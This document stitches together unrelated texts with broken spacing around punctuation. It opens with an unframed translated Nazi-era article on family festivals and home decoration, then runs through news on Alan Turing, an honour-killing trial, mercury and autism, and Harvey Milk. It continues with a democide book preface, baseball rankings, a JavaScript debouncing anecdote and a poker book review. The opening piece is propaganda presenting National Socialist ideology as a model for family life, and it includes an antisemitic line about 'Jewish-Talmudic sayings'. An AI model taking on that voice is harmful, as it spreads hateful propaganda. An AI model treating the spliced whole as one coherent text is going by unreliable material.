We spread our faith best when we set an example ourselves rather than just telling others what to do .
It is not surprising that the home is often so uneven and inadequate , since the examples of the last decades were poor and not everyone can make his own furniture , pictures , and other items — and in an exemplary manner .
The path has to be shown , and it is obvious that the party ’s political leaders must be the models .
In these things , too , National Socialism wants to reach the entire people , and lead it to what is consistent with its deepest nature .
Family festivals , too , are not what they should be , which leaves a gap and dissatisfaction .
We are not quite sure what to do , and cannot figure it out just by thinking about it ; we lack the proper customs .
Jewish - Talmudic sayings should not hang from our walls , but rather the Führer ’s words .
They alone are the guiding principles of our lives .
In many areas , we are just getting started , and sometimes — and this is not a reproach — one cannot avoid the impression that something is too artificial and intellectual .
We need time and patience until something valuable results and customs take root .
A large number of our political leaders want to gain a foundation here , and will cheerfully get to work .
The church , for example , has taken on many things that involve the family .
In our people ’s life , a variety of short - term solutions and wrong turns , even major errors , have affected good customs or made them unpleasant .
Here , we want to consider family festivals and the arrangement of one ’s home from several aspects .
They are matters that have been worked out over the years and can now be presented to a larger audience .
There are works of art that are not handmade or unique , but do show a sure sense of our people , customs , and knowledge .
I begin with the three festivals of human life .
The cradle festival , the celebration of the birth of a child conducted within a small family circle , is something new for many people .
We are convinced that this is something fathers must take on once again .
We do not want to imitate a church ritual , although we realize that the church did not hesitate in the past to imitate the customs of our ancestors .
It was an old custom to light a fire for the new born child .
It grew out of the idea that life is like a fire .
The Norns , for example , kept a fire burning as long as life lasted .
In our case , we no longer burn a whole log , and a candle does not last very long , so we burn the candle on a “ life candelabra , ” which will be the child ’s own .
In place of the child in the illustration to the right , the ancient life rune stands , with an arc on both sides that surround it , just as parents surround and protect a child .
Another gift is a cabinet for certificates , mementoes , and family art .
A plaque on the wall with the name of the child carved on it will always be a happy reminder for the parents .
The young mother receive a piece of necklace with the child ’s name on it , to which the names of future children could be added later .
Other meaningful gifts a beautiful cradle with a tree of life and a few animals carved or painted on it , cloth , or jewelry .
A wedding is the next important life festival .
Two people join their lives , surrounded by their loved ones and friends .
The room is appropriately decorated .
A candlestick the light of life that they will preserve and pass on .
A family cabinet for documents , jewelry , valuable clothing , a family candelabra , with room above for the name and candles for each of the children , with the man and wife below , with their ancestors to either side .
This illustrates our conception of a people and a family .
The bridal pair enters their new home through a carved door ; bowls and bread plates express their duties in life .
The end of life is marked by a funeral .
We light the life candle for the last time , or candles on the family tree .
May a child soon replace the light that has gone out and carry on .
A memorial stone or wood carving is placed on the grave .
We want to be sure that our ideas and nature also come to expression here .
Then there are annual festivals : some are festivals of the whole people ’s community , others of a family .
Easter and Christmas stand out .
Easter has already been moved outdoors , but large wooden eggs are filled with candy as presents both for children and adults .
Christmas , however , is entirely tied to the home and we want to transform it from a children ’s festival to a family festival .
The winter solstice celebrations of party affiliates continue .
The green tree itself is a symbol of life , emphasized by the apples and nuts hanging from it .
And once again , instead of hanging junk on the tree , we hang shaped cookies , the forms of which are still preserved in our customs .
They are cut from dough and sprinkled with sugar , taking the form of deer , swans , eagles , squirrels , horses , fish , branches , etc .
( He who can not prepare these himself can order a variety from the Oehmel Bakery in Vienna , Kohlmarkt . )
The tree ’s stand was given little attention in the past , but it can be set in a nicely done frame , a cross , or a beautifully carved tree stand .
Such a tree stand changes the festival , since it is a family heirloom that , however simple it may be , makes an impression .
The wreaths symbolize the closed circle of our lives and of time , of the year ’s and the months ; the spokes symbolize the seasons .
Most Christmas tree stands are elegantly carved .
It is possible , however , to make them simpler without losing any of their meaning or significance .
Several more things about arranging a home .
We reject anything showy , cold , falsely elegant , or extravagant .
Household items should be simple and genuine , yet still have personality .
The lights are very important .
If they are cold and mass produced , they impact the whole room .
Dusty lampshades recall old - fashioned bourgeois styles .
Here , too , wood is the noblest and warmest , reflecting our nature and desires .
It is no more expensive to buy wooden ceiling , wall , table , or standing lamps than to buy mass produced items .
The same is true of many pieces of furniture , frames , pictures , porcelain , ceramics , and metal ( particularly well - made wrought iron ) .
When enough political leaders arrange their homes in this manner , other party members and people ’s comrades will follow their example and our worldview in these areas will take deeper root .
Little things are often decisive ; their very simplicity has something compelling about it .
On birthdays or other festivals , the candles of all those still living burn .
I provide several examples of my own work as examples .
The larger circle that will see them here will certainly find then stimulating .
Editorial note :
The housewares industry is gradually beginning to make major changes .
More than ever , we must make every effort to bring worthy German craftsmanship to expression .
We see the craftsmen who are again expressing a German sense of form as important leaders and bearers of German interior decoration .
Let us therefore let worthy German craftsmen make our household items .
We thereby encourage them in the important task of making the spiritual attitudes of the Germanic person visible .

He may have played a pivotal role in securing victory in the Second World War for his country six years earlier , but few outside the academic community would have recognised Alan Turing as he made his way down Manchester 's Oxford Street shortly before Christmas in 1951 .
Someone who did notice the athletically - built scientist , however , was a young working class gay man called Arnold Murray .
Homosexuality was still illegal under the same repressive laws which had sent Oscar Wilde to jail half a century earlier .
But regardless of the risk , the chance encounter was to develop into something more substantial and Murray spent a number of nights at the older man 's modest home in suburban Wilmslow .
A month later , after Turing , a veteran of the then still secret Bletchley Park code - cracking team , had been giving a talk to the BBC on his pioneering work on artificial intelligence , he returned home to find his house burgled .

The culprit was an acquaintance of Murray's , who would prey on Murray 's lovers , thinking they would be so afraid of being outed that they would not report the thefts to the police .
But Turing defied this convention and went straight to the police , where he admitted his affair – a " crime " for which he was spared the normal two - year jail term in favour of a hormonal treatment designed to beef up his masculine urges and suppress his homosexuality .
The resulting publicity was to prove too much to bear and in June 1954 , the 41 - year - old was found dead in bed by his housekeeper .
He had eaten an apple he had laced with poison .
The consequences which unfolded were not only a tragedy for Turing , his friends and family , it also robbed the world of one of the greatest thinkers of the 20th century .
Now campaigners are demanding an official apology from the Prime Minister Gordon Brown , recognising the " consequences of prejudice that ended his career " .
More than 700 people have signed a petition started by the leading computer scientist John Graham - Cumming on the Downing Street website , including gay rights campaigners , politicians and scientists .
" What really annoyed me about this was here was a man who died in his early 40s because he was a homosexual .
He was a war hero but here was a part of our history that we were turning a blind eye to when we should be celebrating it .
There were a lot of homosexual people during the war doing incredible work – if it was not for Turing we would most likely be having this conversation in German , " Mr Graham - Cumming said .
Turing had already made major contributions to mathematics and the embryonic computing sciences before the outbreak of hostilities in 1939 .
But it was for his work among the wartime Enigma code crackers at Bletchley Park for which he will be best remembered .
" Turing realised that we had to turn what was then a cottage industry of code breaking into a full scale industry .
He was probably the most important person there , " said Simon Greenish , director of Bletchley Park Trust .
His " bombe " machine was able to rapidly de-code the 158 million , million , million variations used by the Nazis in their commands with the creation of a prototype high speed processor .
It saved tens of thousands of lives and variations on the original helped both the British and the US to eventual victory .
But although he was , by any measure , a genius , Turing was an idiosyncratic figure bordering on the strange .
A runner and rower of Olympic ability , he used to occasionally run the 40 miles between London and Bletchley to attend meetings .
His behaviour and high - pitched voice drew furtive smiles from colleagues who tolerated his eccentricities such as chaining his tea mug to the radiator or riding his bicycle wearing a gas mask to avoid hay fever .

After the war , and having been awarded an OBE , Turing moved to the US to work at the National Physical laboratory where he began work on creating the stored - program computer but returned to Manchester in 1948 , where he continued his pioneering work in the field of mathematical biology .
But the arrest and conviction in 1952 for gross indecency shattered him .
The chemical castration caused his breasts to enlarge and bloated his athletic physique .
He was also banned from travelling to America .
What followed was described by his biographer David Leavitt as a " slow , sad descent into grief and madness " and Turing began travelling abroad in search of sex safe beyond the reach of the British law .
Professor Richard Gill , Professor of mathematical statistics at Leiden University , is among those to sign the petition .
" He was one of the geniuses of the 20th century and I have the feeling he was also a pretty decent guy .
How his life ended was incredibly sad .
In his last years he was thinking very deeply about some very difficult puzzles which give most people a bit of a headache .
He was surely going further with this work and was certainly not finished yet , " he said .
But there is another twist in the story of Alan Turing .
Some have been moved to question whether he saw himself as a gay martyr .
His chosen mode of death echoed his favourite fairytale Snow White , from which he was often moved to quote the phrase " Dip the apple in the brew , let the sleeping death seep through " .
His family insisted his death was merely a tragic accident while others have even hinted more darkly at murder because the inquest was never to establish that the apple contained cyanide .
Recent years have seen his reputation partly restored .
A memorial statue has been erected on the fringes of Manchester 's Gay Village while the city 's inner ring road bears his name .
An official apology , however , continues to elude him .
Homosexuality and the law : Why Alan Turing was considered a criminal
* The 1885 Criminal Law Amendment Act made any homosexual act illegal , even in private .
Among the most famous prosecutions was that of Oscar Wilde in 1895 .
* Section 11 stated that " any male person who , in public or private , commits ... any act of gross indecency with another male person , shall be guilty of a misdemeanor , and being convicted thereof shall be liable at the discretion of the court to be imprisoned for any term not exceeding two years , with or without hard labour . "
* This part of the Act was inserted at the last minute after being drafted by the MP Henry Labouchere .
It did not fit in with the rest of the Act , which dealt with sex crimes relating to young women , but was still passed by the House of Commons .
* The amendment was described as a " blackmailer 's charter " as it effectively outlawed any and every form of male homosexuality .
It prompted a number of prosecutions .
* The Act was repealed in England and Wales in 1956 , but homosexuality was not fully legalised until 1967 .
Underground CERN : it ’s Half - Life in real - life
It ’s one of the greatest games of all time .
You clamber over pipes and through ducts .
Cables of unclear electrical status dangle uncomfortably close to puddles of water .
Tunnels lit by rudimentary emergency lighting lead on and on past a hissing steam pipe , then dripping water , then silence , until the darkness slowly reveals a moist and fleshy lump growing out of the ground .
The game is high energy physics , though there are a couple decades of decay between these scenes and active science .
A few years back , shortly before the game Half - Life 2 came out , a group of us explored the little - traveled CERN tunnels recorded in the photos below .
The resemblance to the original Half - Life–with its steam leaks , ventilation shafts , and dark corners hiding headcrabs–is uncanny ( though my observations indicate that CERN ’s dark corners are not fully populated ) .
It ’s a testament to Half - Life ’s genius design and storytelling that the fantasy of Gordon Freeman ’s life becomes so plausible in this real - life setting .
It ’s also a testament to the awesomeness of science !
High energy physics these days requires all the infrastructure of a large industrial facility with some extra loving attention paid to cryogenics , cables , and computing clusters .
It ’s amazing to think that these abandoned tunnels , pipes , and cables , though extensive , are dwarfed by the facilities still in operation and newly built for the LHC .
It ’s almost enough to make a scientist wonder , “ will this open a dimensional rift ? ” and as a backup , “ where is the nearest crowbar ? ”

Index IMPORTANT NOTE : Among all the democide estimates appearing in this book , I have revised two upward .
I have changed that for Mao's famine , 1958 - 1962 , from zero to 38,000,000 .
And thus I have had to change the overall democide for the PRC ( 1928 - 1987 ) from 38,702,000 to 76,702,000 .

Such democide has been far more prevalent than people have believed , even several times greater than the number killed in all of this century 's wars .
Just consider that alone 61,911,000 people were murdered by the Soviet Union , 38,702,000 by the Chinese communists , 10,214,000 by the Chinese Nationalists , 17,000,000 by the German Nazis , and 5,890,000 by the Japanese militarists during World War II .
This does not even exhaust the list of this century 's mega- murderers , which also would include the past governments of Turkey , Cambodia , Pakistan , Yugoslavia ; nor does it include the lesser killers responsible for hundreds of thousands of corpses each , such as past governments of Uganda , Indonesia , Albania , Burundi , Czechoslovakia , Ethiopia , Hungary , Romania , Spain , and Vietnam .
Then there are the numerous third - class murders who have " only " killed in the tens of thousands .
In sum well over 100,000,000 people have been murdered by their governments since 1900 , several times greater than the 35,654,000 battle - dead from all the foreign and domestic wars fought in these years , including World Wars I and II .
Many explanations have been offered for such killing , but I contend that most fundamentally the root cause is arbitrary , undisciplined power in the hands of tyrants .
That where ever such power has been centralized and unchecked , the possibility exists that it will be used at the whim of dictators to kill for their own ends , as by a ruling group for ethnic - racial purity , national unity , or greater national glory , or by a doctrinaire party for development , equality , or utopia .
The flip side of this is that where power is restrained , balanced , and checked , mass murder is relatively rare .
Indeed , I believe that there is a strong inverse relationship between democratic institutions , which restrains and disciplines power , and the extent of government killing , whether that in domestic or foreign war and violence , or in genocide or mass murder .
The more democratic and less totalitarian or authoritarian a state , the less government killing ; the less democratic and more totalitarian or authoritarian a state , the more government killing .
I have found this to be true for warfare , 3 and the basic purpose of this and the other two books mentioned above is to determine whether it also holds for genocide and mass murder .
The evidence so far suggests that it does .
The most rigorously totalitarian countries in the world , Stalin 's Soviet Union , Hitler 's Germany , Mao's China ( as will be shown here ) , and Pol Pot 's Cambodia have also been this century 's greatest killers .
What must be further explored , however , is whether in fact the correlation holds up when all cases of democide in this century are analyzed .
Assessing this will be the onus of the next volume .
The primary purpose of this work on China , however , is to estimate the number of people killed in cold - blood for the various governments that China has had since 1900 .
While this is basically a statistical aim , the development of these statistics and their understanding could not be left to a simple statistical and methodological elaboration .
To fully develop the statistical estimates required comprehending their human context ; to explain why this killing occurred , necessary if the role of power is to be unraveled , required imbedding the estimates in their history .
But at the same time , whatever totals were determined had to be carefully documented and statistically justified if others were to have any confidence in them and build on this work .
Accordingly , I layer this book in the same way as I did the one on Soviet democide .
Its chapters present successive periods in the history of China , with each chapter being divided into three basic parts .
The first presents the history of the period , within which the nature and amount of democide and other forms of killing are presented .
The second is a detailed statistical table giving the basic democide estimates and their sources and qualifications , and my calculations of sub - totals and totals for the period .
And the third is an appendix that explains , elaborates , and justifies the computations and estimates I make in the statistical table .
Both this table and appendix are prepared for those professionally interested in the statistics and can be ignored by those who simply want to read about the democide and its history and context .
This part is meant to stand on its own .
I had to violate this organization for the chapters on the PRC , however .
Because of the need to carry out some calculations through each of the periods from 1949 to 1987 , especially for forced labor dead , the estimates and calculations of communist democide are included in one very large table ( Table II.1 ) , which is then prefaced with an equally detailed appendix describing what was done ( Appendix II.1 ) .
Because of this arrangement , the book is divided into two parts .
The first considers the periods up to the People 's Republic of China ( PRC ) , the second part covers the subsequent periods .
The book begins with in Chapter 1 with an executive summary and general theory of China 's democide .
A similar chapter focusing on the PRC begins Part II .
Only chapter 1 need be read for the major findings of this book ; Chapter 8 if their elaboration for the PRC is desired .
A methodological appendix at the end of this book presents some of the major principles and techniques underlying the estimation process ; it is virtually identical to the one appearing in the book on Soviet democide , except for an important revision in the definition of democide ( I now accept indiscriminate urban bombing as democide ) 4 .
It also presents the overall philosophy governing the estimation process .
For those curious as to how I could dare assert anything like " the communists probably murdered 38,702,000 people " for a country with such awful statistics , where even population estimates for all the years up to the 1960s varied widely by hundreds of millions , the methodological appendix should be helpful orientation before reading or using the rest of this book .
I also should note here what I pointed out in the Soviet book .
There is a clear division in style between the various appendices and the historical narrative .
In the appendices I have tried to be as objective , neutral , and balanced in as prudent a direction as possible , recognizing that we all have biases that work against our best intentions in surprising ways .
However , in the narrative I have been less than dry and disinterested .
I am clearly horrified by the nature and extent of the mass murder being recorded here ; and although I tried to check my tendency toward unloading my feeling on the killers , nonetheless a style remains that is more assertive , less " balanced " , than some specialists and historians might desire .
If this be so , then I can only say that it is to others I must leave writing with dispassion about the murder of millions of human beings .
One final comment on the term murder .
If anything may appear to display a less than professional bias , it may be the consistent accusation that the Nationalists , communists , warlords , or Japanese murdered these millions .
I am doing this , however , because I believe the technical meaning of murder fits what was done .
To murder someone means to unlawfully and purposely kill them , or to be responsible for their death through reckless and depraved indifference to his life ( as in the Nationalist conscription drives or the communist forced labor camps ) .
As established by the Nuremberg War Crimes Tribunal after World War II , " crimes against humanity " consists of
murder , extermination , enslavement , deportation and other inhuman acts done against any civilian population , or persecutions on political , racial or religious grounds , when such acts are done or such persecutions are carried on in execution of or in connection with any crime against peace or any war crime .
5
This certainly covers much of the killing of unarmed soldiers and helpless civilians by the Nationalist and communists during their various wars , and the Japanese democide in China during World War II .
Indeed , top Japanese leaders were convicted of such war crimes by the Allies after the war .
As for democide in time of peace , the Genocide Convention , passed by the General Assembly of the United Nations in 1948 covers much of that .
By Article I :
The Contracting Parties confirm that genocide , whether committed in time of peace or in time of war , is a crime under international law which they undertake to prevent and to punish .
6
The Soviet representative , among others , successfully fought to limit the interpretation of genocide to national , religious , ethnic , and language groups .
The massacre of political groups and opponents are purposely excluded .
But a prior resolution of the General Assembly passed in late 1946 explicitly covers them .
According to this resolution ,
Genocide is a denial of the right of existence of entire human groups , as homicide is the denial of the right to live of individual human beings ....
Many instances of such crimes of genocide have occurred , when racial , religious , political and other groups have been destroyed , entirely or in part ....
The General Assembly Therefore , Affirms that genocide is a crime under international law which the civilized world condemns , and for the commission of which principals and accomplices -- whether private individuals , public officials or statesmen , and whether the crime is committed on religious , racial , political or any other grounds -- are punishable .
7
All this covers much of the democide to be reported here , and be implication other democide involving the killing of individuals as individuals , or people en masse regardless of their group membership or politics .
According to the international community , such are crimes against humanity .
They are illegal .
If ever the responsible actual or former Chinese officials were tried before an international tribunal for these crimes , they could be punished as murderers .

Having already rolled out our yearly league rankings ( click here to view our Top 15 catchers ) , it ’s time now to look at rankings for dynasty leagues .
We all know that finding a catcher who can produce offensively for the long - term is tough to come by , which is why players like Montero , Wieters and Suzuki jump up a bit .
Still , you ca n’t ignore the consistent producers , no matter what the age , do let ’s see how things play out :
Joe Mauer – Minnesota Twins Brian McCann – Atlanta Braves Victor Martinez – Boston Red Sox Miguel Montero – Arizona Diamondbacks Matt Wieters – Baltimore Orioles Ryan Doumit – Pittsburgh Pirates Kurt Suzuki – Oakland Athletics Geovany Soto – Chicago Cubs Jorge Posada – New York Yankees Mike Napoli – Los Angeles Angels Buster Posey – San Francisco Giants Chris Iannetta – Colorado Rockies Bengie Molina – San Francisco Giants Russell Martin – Los Angeles Dodgers Yadier Molina – St. Louis Cardinals
Honorable Mention – Jesus Flores – Washington Nationals
Notes :
Victor Martinez ’ age is certainly a factor and ultimately , as more research is done , it may cause him to fall a spot or two down the list .
For now , I just ca n’t do it .
He ’s coming off a year where he hit .303 with 23 HR and 108 RBI , numbers that he easily could replicate in the deep Red Sox line - up .
While Wieters may not necessarily perform as the fifth best catcher in 2010 , he showed signs in September that he may live up to all of the expectations awarded him .
He hit .362 with 3 HR and 14 RBI , easing owners concerns .
He will be a solid option in 2010 , with the potential for so much for in the near future , which is why he moves up a few spots in dynasty drafts .
Another player who gets a boost is Soto , though his standing is a little bit more tenuous .
I fully believe that his disastrous 2009 will lead to a big rebound , especially when you consider his .251 BABIP .
While I only pushed Buster Posey up one spot from the regular rankings , the reason is the unknown of if he is going to get regular playing time in 2010 .
As the offseason progresses and the situation with Bengie Molina fully plays itself out , he ’s likely to rise another spot or two based on upside potential alone .
If Molina ultimately resigns in San Francisco ( doubtful ) , he ’ll fall out of the Top 12 .
I wanted to include Jesus Flores as an Honorable Mention because while he likely will ultimately fall outside of the Top 15 when all is said and done , he will certainly be on the rankings once we expand them a bit .
After missing the majority of 2009 , he should be considered a sleeper option for those in two - catcher formats for 2010 .
He had 8 HR and 59 RBI in just 301 AB in 2008 and should be the Nationals everyday catcher .
We ’ll certainly take a much closer look at him soon enough .
What are your thoughts on these rankings ?
Who should be higher ?
Who should be lower ?

Epitaph for Vladimir Visotski
This is an excerpt to a version of the song , by Karsmarski Jacek ( Polish dissident songwriter ) , which includes Ciro Diaz in his latest album , The Blue Slug , that I listened to compulsively for at least two months , especially on the street with my mp3 inherited from a friend who now has an I - pod .
The song ( in summary , which runs about ten minutes ) is about a desperate artist going through the circles of hell in search of an answer or death , and at the end of his journey there is only loneliness and the weight of the supreme power above himself .
So I found myself at times catching the bus across Havana at 12 noon in August under the perennial sunshine and with the distressing feeling of not going anywhere , or arriving too late , or going for pleasure ...
I feel that I have already arrived at the eighth enclosure ( this is the finale of the song ) where there is nothing , and I feel useless and empty , and I look at people without faith who walk along the street and who have so much fear that they no longer know they 're afraid , and who have seen so many Roundtables and so many news broadcasts that they no longer know what belongs to reality or just to the TV screen .
They cannot discern that they no longer believe , but cannot disbelieve either , and just move along past me not going anywhere .
While Dragon Age : Origins is a single player gaming experience , BioWare is taking steps to make sure players can still connect and share their game together .
The PS3 , Xbox 360 , and PC versions of Dragon Age : Origins will be able to connect and share their experiences on a new social networking site .
BioWares social website will track accomplishments and choices made through the game to be shared with your fellow Dragon Agers .
The PC version of the game will even share important moments through screenshots , like defeating a boss - though , manual uploads to the site are possible as well .
What benefits could it have ?
Perhaps it 'll help you see a path through a certain situation by the choices another player makes .
Maybe the screenshot of the boss defeat lends a clue to his weakness and gets you over the hump .
It may not be a substitute for the lack of co-op in the game , something Bioware 's Baldur 's Gate had , but it 's still an interesting way to work together .
What did BioWare have to say on the topic ?
" One of the things for us that was really important and we 're clearly seeing it on PC games — and coming across to consoles — is basically having a social experience of some sort . "
We could n't agree more .
It may not be co-op , but it 's still gaming together in a way .

A 15 - year - old Muslim girl was murdered by her father and his two brothers in an ‘ honour killing ’ after they objected to her relationship with a man twice her age , a court heard today .
Tulay Goren was allegedly killed and buried in the back garden of her home in Woodford Green , north London in 1999 after her family learned she was involved with 30 - year - old factory worker Halil Unal .
The Old Bailey heard that Ms Goren was murdered by her father , Mehmet Goren , 49 , after consultation with a ‘ family council ’ that included his brothers Ali , 55 , and Cuma .
The three men , the court was told , also planned to kill Mr Unal , 42 , but he was warned of this plot by his girlfriend hours before she died .
Download the new Independent Premium app Sharing the full story , not just the headlines
Opening the case for the prosecution Jonathan Laidlaw QC told the jury that the men viewed Ms Goren as a “ worthless commodity ” after learning that she had lost her virginity to Mr Unal and so could not be married off in exchange for money .
But despite more than a decade having passed since the alleged honour killing , the girl ’s body has never been found and the case has only been brought to court now after the girl ’s mother agreed to testify against her husband .
The prosecution alleges that Ms Goren was murdered on 7 January 1999 – three years after she entered Britain from her Kurdish homeland in eastern Turkey as an illegal immigrant , and seven months after she met Mr Unal .
The apparent motive was that the Goren brothers felt Ms Goren had brought shame upon the family by starting a relationship with Mr Unal , who was not only much older than her , but was also from a different branch of the Muslim religion than that to which they belonged .
He was a Sunni , they were Alevi Muslims .
The court heard that the Ms Goren refused to end the relationship and eventually ran away from home on 14 December 1998 to live with Mr Unal in Hackney , east London .
She stayed there with until 6 January 1999 when Mehmet Goran arrived at Mr Unal ’s house to ‘ kidnap ’ his daughter .
It was the last time Mr Unal saw his girlfriend alive .
The court was told that , because the body has never been found , it is not known how Ms Goren was killed .
But the jury will hear evidence from the girl ’s mother , Hanim .
She will tell the court how her husband told her that their daughter had run away from home while he went out for food .

In the days that followed the disappearance , Mrs Goren noticed scratches and a wound on her husband ’s hands .
She also noticed that two knives were missing from the kitchen as was a roll of black bin liners .
Mrs Goren also says she noted that her husband washed the shirt he had been wearing the day their daughter disappeared .
Mr Laidlaw explained : “ In their entire married life the defendant had never previously washed a single piece of clothing . ”
Finally Mrs Goren will tell the jury that the morning following the disappearance she saw that the back garden had been dug up .
Her husband said he was intending to plant onions and flowers , but Mr Laidlaw added : “ By that time they had lived at [ their home ] for five years and he had never planted vegetables before .
He did not even own gardening tools and , when asked , the defendant told his wife he had used a meat cleaver to turn the soil over . ”
The three men are also charged with plotting to kill Mr Unal .
After ‘ kidnapping ’
Ms Goren , Mehment , according to the prosecution , forced his daughter to phone Mr Unal and arrange for him to come to their home to collect her .
Mr Unal was wary and refused .
Later he received another call from the girl who told him : “ Do n’t come here , they are trying to lure you into a trap . ”
Days later Mr Unal , who was not aware that his girlfriend was , according to the prosecution , already dead , did agree to meet with Mehmet Goren .
At that meeting he was stabbed in the back with an axe .
Mehmet Goren was convicted of wounding with intent to inflict grievous bodily harm in 2001 but the prosecution now alleges that the attack was arranged by all three defendants and is evidence of a conspiracy to murder Mr Unal .
All three men deny murder and conspiracy to murder .
The trial continues .
Oct. 19 , 2009 -- Blood levels of mercury are similar in children with autism , those with other developmental problems , and those who are developing typically , according to a new study .
'' There has been discussion about whether children with autism have high levels [ of mercury ] , '' says the study 's lead author , Irva Hertz - Picciotto , PhD , an epidemiologist , professor , and chief of environmental and occupational health at the University of California , Davis , and a researcher at the MIND Institute there .
Hertz - Picciotto cautioned that her recent study does not examine whether mercury plays a role in causing the disorder , which has been the focus of ongoing debate .
Major studies of children who were given vaccines with the mercury - containing preservative thimerosal ( now phased out of most vaccines given to children ) do n't find a link between the vaccines and autism , but some organizations led by parents of autistic children doubt those conclusions .
The blood levels in the study were taken after a child had already received a diagnosis of autism , a developmental disorder now believed to affect one in 91 U.S. children and marked by difficulty in communication , social interaction , and learning .
Some took exception with the new study .
'' Measuring blood levels of mercury is a useless way to assess chronic damage or pathology from mercury , as it clears the bloodstream relatively rapidly , " says Jim Moody , a director for the Coalition for SafeMinds ( Sensible Action for Ending Mercury - Induced Neurological Disorders ) , an organization that investigates the risks of mercury exposure .
Milk was assassinated in 1978 , less than a year after his election California Governor Arnold Schwarzenegger has signed into law a bill that establishes a day recognising US gay rights leader Harvey Milk .
Harvey Milk Day will be marked in California on 22 May , Milk 's birthday .
The activist was assassinated in 1978 .
Mr Schwarzenegger vetoed a similar bill last year .
In the interim , Milk was posthumously awarded the Presidential Medal of Freedom and was the subject of a film for which actor Sean Penn won an Oscar .
Milk was a leader in the gay rights movement and was elected to the San Francisco Board of Supervisors in 1977 .
According to the new law , he was the first openly gay man elected to public office in a major public city .
He was assassinated in November 1978 , after 11 months in the role .
Sean Penn 's portrayal of Harvey Milk earned him an Oscar Vetoing the previous bill in 2008 , Mr Schwarzenegger said that Milk should be honoured locally by those to whom he made the greatest difference .
The governor 's spokesman , Aaron McLear , told Associated Press on Monday that the publicity Milk and his work had received over the past year had been a factor in his change of view .
" That made the difference from last year : he 's really come to symbolise the gay community in California , " he said .
The day will not be a state holiday but will be marked by public schools .

What follows is an account from the author ’s experience .
Some details have been changed for the usual reasons , and a poor memory has fuzzed out the rest .
UPDATE : it turns out the technique described below is known as debouncing .
What an awesome name !
My last job was for a company that made case - management software .
With this software , you could track all kinds of data about your case : you could categorize it , sub - categorize it , say where and when it happened , note whether it was still open , track who was responsible … all kinds of stuff , great for data fiends .
One of our customers ’ favorite features was the reports , and they were pretty spiffin’ .
But , not being ones to rest on our laurels , we were adding pivot - table reports , so you could count the number of cases , grouped by any criteria you wanted .
The input screen let the customer pick their pivot criterion , and which criteria they wanted as columns , for sub-counts .
We struggled to name these UI fields — something lucid , something explanatory , something evocative — something to make them understand what kind of report they were in for .
After a while , we decided to just show them : when they changed their pivot criterion , we ’d run some javascript to render a skeleton report , same as the real report , but minus the data .
It would save them time , and save our servers .
The javascript was pretty involved .
It had to generate the same HTML as we did for the pivot table , which meant it had to know ( or make up ) values for each criterion , like all the case categories and sub- categories , and which sub - categories belonged to which categories .
And we let the customers pivot on up to THREE , count ’em , different criteria .
And it had to happen each time the user picked different pivot criteria .
It took a few tricks , but we got it working .
It ran slowly , maybe a few seconds , but it was quick enough , probably , especially once we threw in a little “ please wait ” spinner .
Then we realized we needed to re-render whenever the window resized .
No biggie , I thought , and I quickly added window.on Resize( reportPreview ) ; .
It worked great , except it re-rendered the report with every pixel - wide movement of the mouse , as the window was dragged to new widths and heights .
Calling a function , one that runs for a few seconds , a hundred times in the time it took to widen the browser an inch , meant a locked browser .
It meant “ time to get more coffee , ” and after , “ time to fix the bug . ”
I knew we could delay calling reportPreview , but we only wanted to delay it when the window was being resized — when the user changed the columns , there was no reason to wait .
I was sure window.setTimeout ( ) would do what we needed , but I did n’t want to muck up reportPreview ( ) with it .
I ’d been reading The Little Schemer lately , and noticing some striking similarities between javascript and scheme : first - class functions , and higher - order functions that take functions as arguments , and return other functions as values .
It was fun reading , with its strange teacher - student dialog style .
The material was better than brainteasers , and I knew it would make me a better programmer down the road , but I did n’t think of it as relevant to the day - job , as …applicable .
Then I realized higher - order functions were a way out of this .
I could write a function , delay , that would wrap one long - running , slow - poke function in another function : an intermediary that you could call as many times a second as you wanted , but it would only call the slow - poke once things had settled down .
delay would let us keep setTimeout out of reportPreview .
Something like this :
function delay ( millis , slowPoke ) { var timeout
Id = undefined ; //
This is the intermediary .
Call it lots , it wo n't hurt .
return function ( ) { if ( timeoutId ) { //
If we 're waiting ... clearTimeout ( timeoutId ) ; // re-start the clock .
} timeout Id = window.setTimeout( slowPoke , millis ) ; } }
The first time you call the intermediary , it tells the window to call slowPoke after a bit , but every time you call it after that , it starts the clock over .
It ’s like when you ’re in a five - minute time - out , and you start acting up after only three , so your mom says “ Ok , buster , another five minutes . ”
var fiveMinutes = 5 * 60 * 1000 ; var screamAndShout = delay ( fiveMinutes , function ( ) { getBackToPlaying ( ) ; } ) ; screamAndShout ( ) ; //
Aw nuts , I 'm in time - out .
//
I 'll be good for as long as I can , but ... screamAndShout( ) ; // dang , five MORE minutes !
Once delay was in place , running reportPreview when the window was resized was no problem .
function reportPreview ( ) { // recursion , DOM manipulation , insanity ... } columnPicker.onChange(reportPreview ) ; window.onResize( delay ( 100 , reportPreview ) ) ;
After testing , we found that delaying it for 100 milliseconds made all the difference in the world .

Let There Be Range Review
While the majority of poker books are authored by players who have become household names , an increasing number of texts are emerging by names that are familiar more to the online set and less to the recreational player .
Add to that list ‘ Let There Be Range : Crushing SSNL / MSNL No- Limit Holdem Games ’ , co-authored by Cole ‘ CTS ’ South and Tri ‘ Slowhabit ’ Nguyen , an ebook aimed at intermediate NLHE players .
Tip :
Get poker books like this free with PTP Rake Rewards .
Overview
Small and midstakes NL makes up the fat majority of online poker cash games , so it ’s no surprise that a variety of training aides are focused on that market .
LTBR is a focused course on how to beat a limit range that roughly spans 1/2 to 5/10 .
The book is only available as an eBook ( DRM protected ) and is about 80 pages long .
Pros
Cole South is one of the more respected instructors at CardRunners , and his presence on the writing team allows average players access to some proven insights about no limit specifically and poker in general .
Nguyen is also a proven player with a history of articulating tricky concepts in concise , understandable terms .
The result : an effective author pairing that blends the esoteric and the execution to good effect .
The content is generally presented with a very tight focus , so even though the book is a bit short by most standards , it still measures up quite well against your typical poker book in terms of quantity of ideas .
As far as content quality goes , LTBR outshines most of its peers by investigating the modern no limit cash game from some intriguing , yet ultimately pragmatic angles that yield applicable conclusions .
The book does a good job of presenting a mix of logical , empirical and ancedontal support for the author ’s take on the game .
The book really shines in the parts where South and Nguyen do n’t only offer you a strategy , but also articulate the internal struggles you ’ll likely face when attempting to implement the strategy and how to combat those as well .
That ’s a multi-tiered approach that owns up to the fact that there ’s a real gap between book - based strategy and actual application , a fact most texts simply ignore ( at the reader ’s expense ) .
Cons
The price of this book simply puts it out of reach for a good chunk of its intended audience .
Some midstakes players are no doubt ballers , but a good amount will flinch at the $ 947 price tag .
You can also buy the book in two parts , with Part 1 costing $ 297 and Part 2 coming in at $ 697 .
